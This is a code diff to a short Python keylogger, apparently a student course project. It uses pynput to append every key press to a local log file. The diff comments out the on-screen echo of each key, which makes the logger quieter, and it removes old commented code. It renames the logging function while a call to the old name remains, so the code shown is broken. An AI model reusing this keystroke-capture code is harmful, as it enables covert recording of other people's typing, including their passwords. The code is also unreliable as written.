@@ -2,7 +2,7 @@ import time
 import sys
 from pynput import keyboard
 
-def writeToLog(log, text):
+def write_to_log(log, text):
     log.write(text)
     log.write('\n')
 
@@ -16,11 +16,11 @@ def on_press(key):
     log = open("/Users/victorzhang/Documents/Computing/COMP6411/keylogger/fullLogs.txt", 'a')
     key_name = get_key_name(key)
     writeToLog(log, format(key_name))
-    print('Key {} pressed.'.format(key_name))
+    # print('Key {} pressed.'.format(key_name))
 
 
     if key_name == 'Key.esc':
-        print('Exiting...')
+        print('Exiting program')
         return False
 
 def main():
@@ -30,17 +30,5 @@ def main():
         listener.join()
         log.close()
 
-    # with keyboard.Listener(
-    #     on_press = on_press,
-    #     on_release = on_release) as listener:
-    #     listener.join()
-
-    # for key in arrows:
-    #     writeToLogs(log, key)
-    #     writeToLogs(keyboard, key)
-
-    # for key in modifiers:
-    #     writeToLogs(log, key)
-    #     writeToLogs(keyboard, key)
 
 main()
